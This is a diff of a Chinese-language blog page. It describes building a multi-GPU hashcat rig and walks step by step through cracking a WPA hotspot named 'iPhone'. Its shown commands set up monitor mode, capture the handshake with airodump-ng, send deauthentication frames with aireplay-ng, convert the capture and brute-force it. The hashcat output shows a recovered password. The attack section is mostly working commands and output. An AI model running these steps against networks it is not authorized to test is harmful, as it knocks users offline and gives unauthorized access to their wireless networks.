@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
   
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
@@ -16,13 +16,13 @@
 <meta property="og:site_name" content="Live to change world">
 <meta property="og:description" content="硬件环境: 主机: TYAN FT77D-B7109 CPU: Intel Xeon Scalable Processor GPU: 1080Ti x 8 (测试时只用了两块, 分别是MSI/技嘉) 内存: 32G 硬盘: 1T SSD">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://www.killshadow.xyz/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/Ubuntu18.04+8x1080ti爆破环境从零搭建/1540284494095.png">
-<meta property="og:image" content="http://www.killshadow.xyz/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/Ubuntu18.04+8x1080ti爆破环境从零搭建/1540286260611.png">
-<meta property="og:updated_time" content="2018-10-24T12:20:20.028Z">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/1540284494095.png">
+<meta property="og:image" content="http://www.killshadow.xyz/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/1540286260611.png">
+<meta property="og:updated_time" content="2018-10-25T01:59:01.907Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Ubuntu18.04+8x1080ti爆破环境从零搭建">
 <meta name="twitter:description" content="硬件环境: 主机: TYAN FT77D-B7109 CPU: Intel Xeon Scalable Processor GPU: 1080Ti x 8 (测试时只用了两块, 分别是MSI/技嘉) 内存: 32G 硬盘: 1T SSD">
-<meta name="twitter:image" content="http://www.killshadow.xyz/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/Ubuntu18.04+8x1080ti爆破环境从零搭建/1540284494095.png">
+<meta name="twitter:image" content="http://www.killshadow.xyz/2018/10/24/Ubuntu18.04+8x1080ti爆破环境从零搭建/1540284494095.png">
   
     <link rel="alternative" href="/atom.xml" title="Live to change world" type="application/atom+xml">
   
@@ -35,7 +35,7 @@
     #container.show {
       background: linear-gradient(200deg,#a0cfe4,#e8c37e);
     }
-  </style>
+  </style><!-- hexo-inject:begin --><!-- hexo-inject:end -->
   
 
   
@@ -44,7 +44,7 @@
 </head>
 
 <body>
-  <div id="container" q-class="show:isCtnShow">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container" q-class="show:isCtnShow">
     <canvas id="anm-canvas" class="anm-canvas"></canvas>
     <div class="left-col" q-class="show:isShow">
       
@@ -179,6 +179,7 @@
 <p>硬盘: 1T SSD</p>
 </blockquote>
 <a id="more"></a>
+
 <h2 id="0x00-配置环境"><a href="#0x00-配置环境" class="headerlink" title="0x00 配置环境"></a>0x00 配置环境</h2><h3 id="0x01-安装系统"><a href="#0x01-安装系统" class="headerlink" title="0x01 安装系统"></a>0x01 安装系统</h3><blockquote>
 <p>目标系统: <a href="https://www.ubuntu.com/download/desktop" target="_blank" rel="noopener">Ubuntu 18.04.1 LTS Desktop</a> (建议安装Server版)</p>
 </blockquote>
@@ -186,6 +187,7 @@
 <h3 id="0x02-安装GPU驱动"><a href="#0x02-安装GPU驱动" class="headerlink" title="0x02 安装GPU驱动"></a>0x02 安装GPU驱动</h3><ol>
 <li><p>安装好系统之后, 可以配置一下更新源(<code>/etc/apt/sources.list</code>,我用的是中科大源), update一下系统. </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span><br></pre></td></tr></table></figure>
+
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update &amp;&amp; apt-get upgrade</span><br><span class="line">sudo apt-get install gcc make p7zip-full git lsb-core</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>然后将Nouveau(NVIDIA通用显卡驱动)禁用:</p>
@@ -196,6 +198,7 @@
 </li>
 <li><p>在官网下载<a href="http://www.nvidia.com/Download/index.aspx" target="_blank" rel="noopener">驱动</a>, 下载好之后:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x NVIDIA*.run</span><br><span class="line">sudo ./NVIDIA*.run</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
+
 <p>或者:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://us.download.nvidia.com/XFree86/Linux-x86_64/375.26/NVIDIA-Linux-x86_64-375.26.run</span><br><span class="line">chmod +x NVIDIA-Linux-x86_64-375.26.run</span><br><span class="line">sudo ./NVIDIA-Linux-x86_64-375.26.run</span><br></pre></td></tr></table></figure>
 </li>
@@ -204,34 +207,41 @@
 </li>
 <li><p>这时候可以看一下显卡配置:</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lspci | grep VGA</span><br></pre></td></tr></table></figure>
+
 </li>
 </ol>
 <h3 id="0x03-安装hashcat"><a href="#0x03-安装hashcat" class="headerlink" title="0x03 安装hashcat"></a>0x03 安装hashcat</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://hashcat.net/files/hashcat-3.30.7z</span><br><span class="line">7z x hashcat-3.30.7z</span><br><span class="line"><span class="built_in">cd</span> hashcat-3.30</span><br></pre></td></tr></table></figure>
+
 <p>这是个比较老的版本, 我用的aircrack跑出来的包用这个版本可以跑. 如果想尝一下鲜也可以:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://hashcat.net/files/hashcat-4.2.1.7z</span><br></pre></td></tr></table></figure>
+
 <p>顺便测试一下速度(在解压后的目录里直接运行<code>./example0.sh</code>即可):</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Bypass</span><br><span class="line">Hash.Type........: MD5</span><br><span class="line">Hash.Target......: example0.hash</span><br><span class="line">Time.Started.....: Sat Oct 20 20:08:33 2018 (27 mins, 0 secs)</span><br><span class="line">Time.Estimated...: Sat Oct 20 22:31:24 2018 (1 hour, 55 mins)</span><br><span class="line">Guess.Base.......: File (example.dict), Right Side</span><br><span class="line">Guess.Mod........: Mask (?a?a?a?a?a?a) [6], Left Side</span><br><span class="line">Guess.Queue.Base.: 1/1 (100.00%)</span><br><span class="line">Guess.Queue.Mod..: 1/1 (100.00%)</span><br><span class="line">Speed.Dev.<span class="comment">#2.....:  8340.3 MH/s (6.61ms) @ Accel:128 Loops:64 Thr:256 Vec:1</span></span><br><span class="line">Speed.Dev.<span class="comment">#3.....:  7938.7 MH/s (6.93ms) @ Accel:128 Loops:64 Thr:256 Vec:1</span></span><br><span class="line">Speed.Dev.<span class="comment">#*.....: 16279.0 MH/s</span></span><br><span class="line">Recovered........: 3035/6494 (46.74%) Digests, 0/1 (0.00%) Salts</span><br><span class="line">Recovered/Time...: CUR:25,N/A,N/A AVG:29,1773,42558 (Min,Hour,Day)</span><br><span class="line">Progress.........: 26411945426944/139573552218112 (18.92%)</span><br><span class="line">Rejected.........: 0/26411945426944 (0.00%)</span><br><span class="line">Restore.Point....: 200933376/1073741824 (18.71%)</span><br><span class="line">Candidates.<span class="comment">#2....: sarusix102x -&gt; 6o9momx49wy3c2</span></span><br><span class="line">Candidates.<span class="comment">#3....: sarseeethelia3 -&gt; 6o9602eugeni</span></span><br><span class="line">HWMon.Dev.<span class="comment">#2.....: Temp: 79c Fan: 62% Util: 94% Core:1860MHz Mem:5005MHz Bus:16</span></span><br><span class="line">HWMon.Dev.<span class="comment">#3.....: Temp: 84c Fan: 78% Util: 94% Core:1771MHz Mem:5005MHz Bus:16</span></span><br><span class="line"></span><br><span class="line">Started: Sat Oct 20 20:08:26 2018</span><br><span class="line">Stopped: Sat Oct 20 20:35:35 2018</span><br></pre></td></tr></table></figure>
+
 <ul>
 <li>关于上面输出的参数解析:</li>
 </ul>
   <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">实际上example0.sh的命令如下:</span><br><span class="line">./hashcat64.bin -t 32 -a 7 example0.hash ?a?a?a?a example.dict</span><br><span class="line"></span><br><span class="line">Session..........:</span><br><span class="line">Status...........: </span><br><span class="line">Hash.Type........: 表示哈希计算的类型</span><br><span class="line">Hash.Target......: 表示目标哈希表</span><br><span class="line">Time.Started.....: 计算开始时间</span><br><span class="line">Time.Estimated...: 估计结束时间</span><br><span class="line">Guess.Base.......: 密码字典</span><br><span class="line">Guess.Mod........: 密码类型(大小写/数字等)</span><br><span class="line">Guess.Queue.Base.:</span><br><span class="line">Guess.Queue.Mod..:</span><br><span class="line">Speed.Dev.<span class="comment">#2.....: 显卡1的速度(8340.0MH/s 约等于每秒83亿次运算)</span></span><br><span class="line">Speed.Dev.<span class="comment">#3.....: 显卡2...</span></span><br><span class="line">Speed.Dev.<span class="comment">#*.....: 总速度</span></span><br><span class="line">Recovered........: </span><br><span class="line">Recovered/Time...: 当前已用时间(分,时,天); 平均需要时间(分,时,天)</span><br><span class="line">Progress.........: 当前进度</span><br><span class="line">Rejected.........: 应该是丢包率(猜的)</span><br><span class="line">Restore.Point....: 当前的进度</span><br><span class="line">Candidates.<span class="comment">#2....: 即将尝试爆破的密码(猜的)</span></span><br><span class="line">Candidates.<span class="comment">#3....: </span></span><br><span class="line">HWMon.Dev.<span class="comment">#2.....: Temp表示当前显卡温度;Fan表示风扇转速;Men内存频率</span></span><br><span class="line">HWMon.Dev.<span class="comment">#3.....: Util表示内存使用率;Core表示GPU核频率;Bus通道数</span></span><br></pre></td></tr></table></figure>
+
 <ul>
 <li><p>关于hashcat命令参数解析(详见<a href="#附录一">附录一</a>):</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-a  指定要使用的破解模式</span><br><span class="line">-m  指定要破解的hash类型所对应的id[下面有一份完整的hash id对照表],几乎现在市面上常用的一些散列类型它都支持,而且每个版本更新都会增加一些新的算法</span><br><span class="line">-o  指定破解成功后的hash及所对应的明文密码的存放位置,可以用它把破解成功的hash写到指定的文件中</span><br><span class="line">--force	忽略破解过程中的警告信息,跑单条hash可能需要加上此选项</span><br><span class="line">--show	显示已经破解的hash及该hash所对应的明文</span><br><span class="line">--increment	 启用增量破解模式,你可以利用此模式让hashcat在指定的密码长度范围内执行破解过程,其实,并不建议这么用,因为破解时间可能会比较长</span><br><span class="line">--increment-min  密码最小长度,后面直接等于一个整数即可,配置increment模式一起使用</span><br><span class="line">--increment-max  密码最大长度,同上</span><br><span class="line">--outfile-format 指定破解结果的输出格式id,一般自己常用3</span><br><span class="line">--username 	 忽略hash文件中的指定的用户名,在破解win和linux系统用户密码hash可能会用到</span><br><span class="line">--remove 	 删除已被破解成功的hash</span><br><span class="line">-r		 使用自定义破解规则,这个后期抽空再说吧,比较的复杂,不是一两句话能说完的</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>真实爆破WiFi密码情况系hashcat参数解析:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat64.bin -m 2500 -a 3 wpahash.hccap ?l?l?l?l?l?l?l?l</span><br></pre></td></tr></table></figure>
+
 <blockquote>
-<p>-m : hash的类型, 2500代表的是WPA/WPA2协议. 详见<a href="② Hash种类">② Hash种类</a></p>
-<p>-a: 有多种参数, 3表示穷举. 详见<a href="#⑤ 攻击模式">⑤ 攻击模式</a></p>
+<p>-m : hash的类型, 2500代表的是WPA/WPA2协议. 详见[② Hash种类](② Hash种类)</p>
+<p>-a: 有多种参数, 3表示穷举. 详见[⑤ 攻击模式](#⑤ 攻击模式)</p>
 <p>*.hccap: 即为<code>aircrack</code>抓到的包之后转化而来的</p>
-<p>?l: 表示所有的小写字母. 详见<a href="⑥ 内置字符集">⑥ 内置字符集</a></p>
+<p>?l: 表示所有的小写字母. 详见[⑥ 内置字符集](⑥ 内置字符集)</p>
 </blockquote>
 </li>
 </ul>
 <h2 id="0x10-Crack实战"><a href="#0x10-Crack实战" class="headerlink" title="0x10 Crack实战"></a>0x10 Crack实战</h2><h3 id="0x11-初始配置"><a href="#0x11-初始配置" class="headerlink" title="0x11 初始配置"></a>0x11 初始配置</h3><ol>
 <li><p>首先需要找一个可以监听注入的USB网卡, 如果笔记本自带网卡能用就更好了. 这里以<code>rt2800usb</code>为例讲解:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># airmon-ng </span></span><br><span class="line">PHY	Interface	Driver		Chipset</span><br><span class="line">phy0	wlp3s0		iwlwifi		Intel Corporation Device 24fb (rev 10)</span><br><span class="line">phy1	wlx7cdd90f1f416	rt2800usb	Ralink Technology, Corp. RT2870/RT3070</span><br></pre></td></tr></table></figure>
+
 <p>可以看到, 有两张网卡, <code>wlp3s0</code>是笔记本自带的英特尔系列网卡; <code>lx7cdd90f1f416</code>是能够监听的新插入的usb网卡.</p>
 </li>
 <li><p>查看网卡状态, 两张网卡的Mode都是<code>Managed</code>:</p>
@@ -245,18 +255,21 @@
 </li>
 <li><p>此时再看一下无线网卡状态:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># iwconfig</span></span><br><span class="line">lo        no wireless extensions.</span><br><span class="line"></span><br><span class="line">wlp3s0    IEEE 802.11  ESSID:off/any  </span><br><span class="line">          Mode:Managed  Access Point: Not-Associated   Tx-Power=0 dBm   </span><br><span class="line">          Retry short <span class="built_in">limit</span>:7   RTS thr:off   Fragment thr:off</span><br><span class="line">          Encryption key:off</span><br><span class="line">          Power Management:on</span><br><span class="line">          </span><br><span class="line">wlan0mon  IEEE 802.11  Mode:Monitor  Tx-Power=off   </span><br><span class="line">          Retry short  long <span class="built_in">limit</span>:2   RTS thr:off   Fragment thr:off</span><br><span class="line">          Power Management:off</span><br><span class="line">          </span><br><span class="line">enp2s0    no wireless extensions.</span><br><span class="line"></span><br><span class="line">enp0s20f0u1  no wireless extensions.</span><br></pre></td></tr></table></figure>
+
 <p>已更改~</p>
 </li>
 </ol>
 <h3 id="0x12-实施攻击"><a href="#0x12-实施攻击" class="headerlink" title="0x12 实施攻击"></a>0x12 实施攻击</h3><ol>
 <li><p>我们的攻击目标是<code>iPhone</code>:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks<span class="comment"># airodump-ng wlan0mon</span></span><br></pre></td></tr></table></figure>
-<p><img src="Ubuntu18.04+8x1080ti爆破环境从零搭建/1540284494095.png" alt="1540284494095"></p>
+
+<p><img src="1540284494095.png" alt="img"></p>
 <p>上图可看到它的mac是<code>74:D2:1D:AE:3F:94</code>, 信道(CH)是<code>1</code>. (记住这两个信息下面有用)</p>
 </li>
 <li><p>接下来我们开两个shell, 一个shell负责监听握手包, 另一个shell负责洪荒攻击两个正常连接的WiFi设备, 我们先看看第一个shell:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airodump-ng --bssid 74:D2:1D:AE:3F:94 -c 1 -w <span class="built_in">test</span> wlan0mon</span><br></pre></td></tr></table></figure>
-<p><img src="Ubuntu18.04+8x1080ti爆破环境从零搭建/1540286260611.png" alt="1540286260611"></p>
+
+<p><img src="1540286260611.png" alt="img"></p>
 <p>可以看出来已经抓到了握手包703个. 对命令参数解释如下:</p>
 <blockquote>
 <p>–bssid: 表示WiFi热点的mac</p>
@@ -267,21 +280,28 @@
 </li>
 <li><p>开启了监听之后, 我们就需要DDoS目标连接了, 这时候在另一个shell输入如下命令:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aireplay-ng --deauth 5 -a 74:D2:1D:AE:3F:94 wlan0mon</span><br></pre></td></tr></table></figure>
+
 <p>隔几秒发一次, 以抓到足够的握手包, 减少爆破的时间.</p>
 </li>
 </ol>
 <h2 id="0x20-开始爆破"><a href="#0x20-开始爆破" class="headerlink" title="0x20 开始爆破"></a>0x20 开始爆破</h2><p>在上面操作的监听过程中, 会在当前路径下保存一个抓到的握手包的数据, 但这个流量包还不能直接让hashcat跑, 需要做简单的处理, 先做一个简单的数据清洗:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ks:~/crack_packet_wifi<span class="comment"># wpaclean wpapass.cap test-05.cap </span></span><br><span class="line">Pwning <span class="built_in">test</span>-05.cap (1/1 100%)</span><br><span class="line">Net 74:d2:1d:ae:3f:94 iPhone</span><br><span class="line">Done</span><br></pre></td></tr></table></figure>
+
 <p>可以看到, 已经成功识别出目标无限的mac. 接下来我们吧数据包转换成hashcat能够识别的hash类型:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@ks:/home/ks/software/crack_pw/crack_packet_wifi<span class="comment"># aircrack-ng wpapass.cap -J wpahash</span></span><br><span class="line">Opening wpapass.cap</span><br><span class="line">Read 3 packets.</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  BSSID              ESSID                     Encryption</span></span><br><span class="line"></span><br><span class="line">   1  74:D2:1D:AE:3F:94  iPhone                    WPA (1 handshake)</span><br><span class="line"></span><br><span class="line">Choosing first network as target.</span><br><span class="line">Opening wpapass.cap</span><br><span class="line">Reading packets, please <span class="built_in">wait</span>...</span><br><span class="line">Building Hashcat (1.00) file...</span><br><span class="line">[*] ESSID (length: 6): iPhone</span><br><span class="line">[*] Key version: 2</span><br><span class="line">[*] BSSID: 74:D2:1D:AE:3F:94</span><br><span class="line">[*] STA: 88:C9:D0:B7:2C:36</span><br><span class="line">[*] anonce:</span><br><span class="line">    E6 A3 D9 3C 95 77 3E 0B 5D 84 CE 65 0D 1C EB 59 </span><br><span class="line">    E4 E4 E3 A5 3A 07 FE D8 47 A1 7C 77 10 66 DC E4 </span><br><span class="line">[*] snonce:</span><br><span class="line">    03 8D 9F 6B A8 4B 27 7D 8E 02 57 56 34 D9 98 2A </span><br><span class="line">    4D 36 1C EA 2D 6A 91 43 4F 30 67 96 81 14 F4 AD </span><br><span class="line">[*] Key MIC:</span><br><span class="line">    21 51 2B 3C 6F 37 CA 9E 09 6C 92 74 45 DC DA 11</span><br><span class="line">[*] eapol:</span><br><span class="line">    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 </span><br><span class="line">    03 03 8D 9F 6B A8 4B 27 7D 8E 02 57 56 34 D9 98 </span><br><span class="line">    2A 4D 36 1C EA 2D 6A 91 43 4F 30 67 96 81 14 F4 </span><br><span class="line">    AD 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC </span><br><span class="line">    04 01 00 00 0F AC 02 80 00 </span><br><span class="line">Successfully written to wpahash.hccap</span><br><span class="line">Quitting aircrack-ng...</span><br></pre></td></tr></table></figure>
+
 <p>接下来就是直接放到爆破的服务器上跑(实测用最新版的hashcat跑不了, 这里用了3.30版本的hashcat)</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat64.bin -m 2500 -a 3 wpahash.hccap ?d?d?d?d?d?d?d?d</span><br></pre></td></tr></table></figure>
+
 <p>几秒钟就跑出来了:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Running</span><br><span class="line">Hash.Type........: WPA/WPA2</span><br><span class="line">Hash.Target......: iPhone (74:d2:1d:ae:3f:94 &lt;-&gt; 88:c9:d0:b7:2c:36)</span><br><span class="line">Time.Started.....: Tue Oct 23 17:43:18 2018 (3 secs)</span><br><span class="line">Time.Estimated...: Tue Oct 23 17:44:52 2018 (1 min, 31 secs)</span><br><span class="line">Input.Mask.......: ?d?d?d?d?d?d?d?d [8]</span><br><span class="line">Input.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.Dev.<span class="comment">#2.....:   535.2 kH/s (6.23ms)</span></span><br><span class="line">Speed.Dev.<span class="comment">#3.....:   527.7 kH/s (6.34ms)</span></span><br><span class="line">Speed.Dev.<span class="comment">#*.....:  1062.9 kH/s</span></span><br><span class="line">Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts</span><br><span class="line">Progress.........: 2207744/100000000 (2.21%)</span><br><span class="line">Rejected.........: 0/2207744 (0.00%)</span><br><span class="line">Restore.Point....: 0/10000000 (0.00%)</span><br><span class="line">Candidates.<span class="comment">#2....: 42345678 -&gt; 41875555</span></span><br><span class="line">Candidates.<span class="comment">#3....: 40689823 -&gt; 49471088</span></span><br><span class="line">HWMon.Dev.<span class="comment">#2.....: Temp: 41c Fan: 29% Util: 97% Core:1860Mhz Mem:5005Mhz Lanes:16</span></span><br><span class="line">HWMon.Dev.<span class="comment">#3.....: Temp: 41c Fan:  0% Util: 97% Core:1809Mhz Mem:5005Mhz Lanes:16</span></span><br><span class="line"></span><br><span class="line">iPhone:74d21dae3f94:88c9d0b72c36:67854312</span><br></pre></td></tr></table></figure>
+
 <p>假设我们把它设置成全字符爆破, 也就是:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat64.bin -m 2500 -a 3 wpahash.hccap ?a?a?a?a?a?a?a?a</span><br></pre></td></tr></table></figure>
+
 <p>则需要几百年(可见, 如果知道WiFi密码的字符组成结构, 也就成功了一半了):</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Running</span><br><span class="line">Hash.Type........: WPA/WPA2</span><br><span class="line">Hash.Target......: iPhone (74:d2:1d:ae:3f:94 &lt;-&gt; 88:c9:d0:b7:2c:36)</span><br><span class="line">Time.Started.....: Tue Oct 23 17:53:33 2018 (31 secs)</span><br><span class="line">Time.Estimated...: Fri Dec 24 03:40:44 2021 (200 years, 198 days)</span><br><span class="line">Input.Mask.......: ?a?a?a?a?a?a?a?a [8]</span><br><span class="line">Input.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.Dev.<span class="comment">#2.....:   531.0 kH/s (6.38ms)</span></span><br><span class="line">Speed.Dev.<span class="comment">#3.....:   517.3 kH/s (6.52ms)</span></span><br><span class="line">Speed.Dev.<span class="comment">#*.....:  1048.3 kH/s</span></span><br><span class="line">Recovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts</span><br><span class="line">Progress.........: 31854592/6634204312890625 (0.00%)</span><br><span class="line">Rejected.........: 0/31854592 (0.00%)</span><br><span class="line">Restore.Point....: 0/69833729609375 (0.00%)</span><br><span class="line">Candidates.<span class="comment">#2....: E]_LINAN -&gt; E;$.1988</span></span><br><span class="line">Candidates.<span class="comment">#3....: Narinane -&gt; N"XZANAN</span></span><br><span class="line">HWMon.Dev.<span class="comment">#2.....: Temp: 66c Fan: 47% Util: 97% Core:1809Mhz Mem:5005Mhz Lanes:16</span></span><br><span class="line">HWMon.Dev.<span class="comment">#3.....: Temp: 65c Fan: 34% Util: 97% Core:1759Mhz Mem:5005Mhz Lanes:16</span></span><br></pre></td></tr></table></figure>
+
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
 <li><a href="https://www.shellntel.com/blog/2017/2/8/how-to-build-a-8-gpu-password-cracker" target="_blank" rel="noopener">How to build a 8 GPU password cracker</a></li>
 <li><a href="https://www.blackhillsinfosec.com/running-hashcat-on-ubuntu-18-04-server-with-1080ti/" target="_blank" rel="noopener">Running HashCat on Ubuntu 18.04 Server with 1080TI</a></li>
@@ -295,6 +315,7 @@
 </ol>
 <h2 id="附录一"><a href="#附录一" class="headerlink" title="附录一"></a>附录一</h2><h3 id="①-hashcat选项解释"><a href="#①-hashcat选项解释" class="headerlink" title="① hashcat选项解释"></a>① hashcat选项解释</h3><p>用法: </p>
